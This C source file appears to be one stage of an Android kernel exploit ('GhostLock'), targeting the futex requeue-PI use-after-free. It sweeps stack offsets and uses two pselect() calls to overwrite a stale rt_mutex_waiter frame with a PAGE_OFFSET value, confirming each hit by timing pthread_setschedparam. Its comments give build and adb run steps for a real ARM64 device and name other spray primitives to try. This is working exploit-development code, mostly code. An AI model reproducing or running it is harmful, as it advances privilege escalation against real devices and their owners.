/*
 * ghostlock_stack_cal.c — stack reclaim calibration (GhostLock/aquaman).
 *
 * Question: how deep into the user stack must the pselect() stamp go before it
 * lands on the waiter's rt_mutex_waiter (the futex_wait_requeue_pi frame)?
 *
 * Mechanics
 * ---------
 * The consumer (pthread_setschedparam on the waiter) calls rt_mutex_get_effective_prio
 * (measured in the lab build asm):
 *     if (task->pi_waiters == NULL) return oldprio;             // frame untouched
 *     t = *(&task->pi_waiters_leftmost->pi_tree_entry + 0x18);  // waiter->task
 *     return min(t->prio, oldprio);
 * i.e. it DEREFERENCES waiter->task (offset 0x30 in the frame) and reads
 * task->prio.
 *
 *   frame intact    : waiter->task == current -> prio ~120 > 99 -> caller enters
 *                     the RT path and the walk in rt_mutex_slowlock calls
 *                     schedule() -> ~60s stall. Baseline already measured on
 *                     the device.
 *   frame stamped with PAGE_OFFSET: reads an int from physical RAM (typically
 *                     < 99) -> fast path, no stall, no oops.
 *
 * Why PAD >= 0x120 and not zero
 * -----------------------------
 * The rt_mutex lives inside the waiter's frame (futex_requeue uses
 * &requeue_pi.waiter, and the rt_waiter is its neighbour). The consumer NEVER
 * reaches that offset: it only reads task->pi_waiters / task->pi_waiters_leftmost,
 * which live in the task_struct. Stamping the rt_mutex is what breaks the device,
 * so the useful window starts AFTER the rt_mutex and runs to waiter+0x50. That
 * gives the [0x120, 0x1c0] interval below. Stamping before that corrupts the lock
 * and the device dies: hence the sweep starts at 0x120, never at 0.
 *
 * Why two pselects
 * -----------------
 * core_sys_select has 6 slots of 40B: 3 copied from userspace (in/out/except)
 * and 3 zeroed with memset (res_in/res_out/res_ex). If the waiter lands in a
 * memset slot, waiter->task = 0 -> deref at 0x68 -> oops. Fix: a second
 * pselect 0x78 bytes SHALLOWER covers exactly the 3 slots the first one zeroed.
 * Order: DEEP pselect first, SHALLOW after.
 *
 * Risk: low. No kernel object is reclaimed for exploitation, nothing is written
 * to cred/SELinux/funcptr, the consumer only reads an int. PADs outside the
 * window are inert (frame untouched) or corrupt the rt_mutex (panic). Hence the
 * sweep starts at GL_PSELECT_SHIFT_MIN.
 *
 * Build (NDK r29, ARM64, API 28):
 *   ~/Android/Sdk/ndk/29.0.14206865/toolchains/llvm/prebuilt/linux-x86_64/bin/\
 *     aarch64-linux-android28-clang -O2 -Wall -Wextra -static \
 *     ghostlock_stack_cal.c -o ghostlock_stack_cal
 * Run:
 *   adb push ghostlock_stack_cal /data/local/tmp/
 *   adb shell /data/local/tmp/ghostlock_stack_cal [pad_min] [pad_max] [trials]
 */
#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#include "ghostlock_target.h"

#ifndef __NR_futex
#define __NR_futex 98
#endif
#define FUTEX_LOCK_PI            6
#define FUTEX_UNLOCK_PI          7
#define FUTEX_WAIT_REQUEUE_PI    11
#define FUTEX_CMP_REQUEUE_PI     12
#define FUTEX_PRIVATE_FLAG       128
#define EDEADLK                  35

#define FLPI (FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG)
#define FUPI (FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG)
#define FWRQ (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define FCRQ (FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG)

#define STAMP_WORD  GL_PAGE_OFFSET
#define MAX_PAD     4096

static uint32_t f_wait, f_target, f_chain;
static volatile int w_ready, w_waiting, w_done, o_started;
static volatile uint64_t pat_len;
static volatile int release_waiter;
static pthread_t waiter_tid;

static long xfutex(void *u1, int op, uint32_t val, void *to, void *u2,
                   uint32_t v3) {
    return syscall(__NR_futex, u1, op, val, to, u2, v3);
}

static uint64_t now_ns(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

__attribute__((noinline)) static void spin_ns(uint64_t ns) {
    uint64_t t0 = now_ns();
    while (now_ns() - t0 < ns)
        __asm__ volatile("" ::: "memory");
}

/* one pselect: 3 fd_sets of GL_PSEL_SIZE bytes, all filled with the pattern.
 * nfds=GL_PSEL_MAX_NFDS is what keeps size on the stack (size <= 0x2a). */
__attribute__((noinline)) static void psel_once(void) {
    static uint64_t pat[3 * GL_PSEL_SIZE / 8] __attribute__((aligned(64)));
    fd_set *sets = (fd_set *)pat;
    struct timespec ts = { 0, 0 };
    size_t i;

    for (i = 0; i < sizeof(pat) / sizeof(pat[0]); i++)
        pat[i] = STAMP_WORD;

    pselect(GL_PSEL_MAX_NFDS, &sets[0], &sets[1], &sets[2], &ts, NULL);
}

/* double stamp: deep (writes pattern in [A, A+0x78) and zeros in
 * [A+0x78, A+0xf0)) then shallow (writes pattern in [A+0x78, A+0xf0)).
 * Result: all of [A, A+0xf0) holds the pattern. */
__attribute__((noinline)) static void stamp(uint64_t pad) {
    volatile uint8_t deep_vla[MAX_PAD];
    volatile uint8_t shallow_vla[MAX_PAD];
    uint64_t dp = pad < MAX_PAD ? pad : MAX_PAD;
    uint64_t sp = (pad > GL_PSEL_SLOT3_OFF) ? pad - GL_PSEL_SLOT3_OFF : 0;

    memset((void *)deep_vla, 0, dp);
    __asm__ volatile("" ::"r"(deep_vla) : "memory");
    psel_once();

    memset((void *)shallow_vla, 0, sp);
    __asm__ volatile("" ::"r"(shallow_vla) : "memory");
    psel_once();

    __asm__ volatile("" ::"r"(deep_vla), "r"(shallow_vla) : "memory");
}

static void *waiter_fn(void *u) {
    (void)u;
    if (xfutex(&f_chain, FLPI, 0, NULL, NULL, 0))
        return NULL;
    w_ready = 1;
    while (!o_started)
        usleep(1000);
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 1;
    w_waiting = 1;
    xfutex(&f_wait, FWRQ, 0, &ts, &f_target, 0);
    xfutex(&f_chain, FUPI, 0, NULL, NULL, 0);
    w_done = 1;

    stamp(pat_len);
    while (!release_waiter)   /* pure spin: no syscall, preserves the stamp */
        spin_ns(1000000);
    return NULL;
}

static void *owner_fn(void *u) {
    (void)u;
    if (xfutex(&f_target, FLPI, 0, NULL, NULL, 0))
        return NULL;
    while (!w_ready)
        usleep(1000);
    o_started = 1;
    xfutex(&f_chain, FLPI, 0, NULL, NULL, 0);   /* deadlock by design */
    return NULL;
}

struct trial_res {
    int stalled;
    uint32_t prio;
    uint64_t us;
};

static int run_trial(uint64_t pad, int with_cmp, struct trial_res *out) {
    f_wait = f_target = f_chain = 0;
    w_ready = w_waiting = w_done = o_started = 0;
    release_waiter = 0;
    pat_len = pad;

    pthread_t w, o;
    if (pthread_create(&w, NULL, waiter_fn, NULL))
        return -100;
    waiter_tid = w;
    if (pthread_create(&o, NULL, owner_fn, NULL))
        return -101;
    while (!w_waiting || !o_started)
        usleep(1000);

    if (with_cmp) {
        usleep(200000);
        errno = 0;
        xfutex(&f_wait, FCRQ, 1, (void *)(uintptr_t)1, &f_target, 0);
        if (errno != EDEADLK) {
            release_waiter = 1;
            xfutex(&f_target, FUPI, 0, NULL, NULL, 0);
            pthread_join(w, NULL);
            return -102;
        }
    } else {
        usleep(1300000);   /* waiter wakes on timeout, clean teardown */
    }

    xfutex(&f_target, FUPI, 0, NULL, NULL, 0);
    pthread_join(o, NULL);

    int spins = 0;
    while (!w_done && spins++ < 250)
        usleep(20000);
    if (!w_done) {
        release_waiter = 1;
        return -103;
    }

    struct sched_param p = { .sched_priority = 0 };
    uint64_t t0 = now_ns();
    errno = 0;
    int r = pthread_setschedparam(waiter_tid, SCHED_BATCH, &p);
    uint64_t dt = now_ns() - t0;

    out->prio = (uint32_t)r;
    out->us = dt / 1000;
    out->stalled = (dt > 1000000ULL);

    release_waiter = 1;
    pthread_join(w, NULL);
    return 0;
}

int main(int argc, char **argv) {
    setbuf(stdout, NULL);   /* panic kills the libc buffer: no evidence */

    uint64_t pad_min = GL_PSELECT_SHIFT_MIN;
    uint64_t pad_max = GL_PSELECT_SHIFT_MAX;
    uint64_t step     = 0x08;
    int max_trials    = 200;

    if (argc > 1) pad_min = strtoull(argv[1], NULL, 0);
    if (argc > 2) pad_max = strtoull(argv[2], NULL, 0);
    if (argc > 3) max_trials = atoi(argv[3]);

    printf("[info] page_offset=0x%llx stamp_word=0x%llx\n",
           (unsigned long long)GL_PAGE_OFFSET,
           (unsigned long long)STAMP_WORD);
    printf("[info] pselect nfds=%d size=%#x slots=%d span=%#x (stack, not kmalloc)\n",
           GL_PSEL_MAX_NFDS, GL_PSEL_SIZE, GL_STACK_FDS_SLOTS, GL_PSEL_SPAN);
    printf("[info] lab: waiter_off_sp=%#llx stack_fds_off_sp=%#llx slot3=%#x\n",
           (unsigned long long)GL_WAITER_OFF_SP,
           (unsigned long long)GL_STACK_FDS_OFF_SP, GL_PSEL_SLOT3_OFF);
    printf("[info] sweep pad=[%#llx..%#llx] step=%#llx trials=%d\n",
           (unsigned long long)pad_min, (unsigned long long)pad_max,
           (unsigned long long)step, max_trials);

    {
        struct trial_res r = { 0, 0, 0 };
        if (run_trial(0, 0, &r) < 0) {
            printf("[baseline] trial failed\n");
            return 3;
        }
        printf("[baseline] stalled=%d prio=%u us=%llu  (%s)\n", r.stalled,
               r.prio, (unsigned long long)r.us,
               r.stalled ? "STALL: frame intact, expected"
                         : "fast: unexpected baseline, review the consumer");
    }

    int hits = 0, trial = 0;
    uint64_t first_hit = 0, last_hit = 0;

    for (uint64_t pad = pad_min; pad <= pad_max && trial < max_trials;
         pad += step, trial++) {
        struct trial_res r = { 0, 0, 0 };
        int rc = run_trial(pad, 1, &r);
        if (rc < 0) {
            printf("[pad %#llx] trial failed rc=%d, stopping\n",
                   (unsigned long long)pad, rc);
            break;
        }
        if (!r.stalled) {
            if (!hits)
                first_hit = pad;
            last_hit = pad;
            hits++;
            printf("[pad %#llx] HIT consumer fast prio=%u us=%llu\n",
                   (unsigned long long)pad, r.prio, (unsigned long long)r.us);
        } else {
            printf("[pad %#llx] stall, frame intact (us=%llu)\n",
                   (unsigned long long)pad, (unsigned long long)r.us);
        }
    }

    printf("[summary] hits=%d first=%#llx last=%#llx\n", hits,
           (unsigned long long)first_hit, (unsigned long long)last_hit);
    if (!hits) {
        printf("[verdict] no PAD hit: the device diverges from the lab "
               "(WAITER_OFF or the core_sys_select frame). Swap the stamper: "
               "setsockopt IPV6 MCAST_JOIN_SOURCE_GROUP or sendmsg, then "
               "recalibrate the range.\n");
        return 1;
    }
    printf("[verdict] PSELECT_SHIFT = %#llx, janela %#llx..%#llx\n",
           (unsigned long long)first_hit, (unsigned long long)first_hit,
           (unsigned long long)last_hit);
    return 0;
}
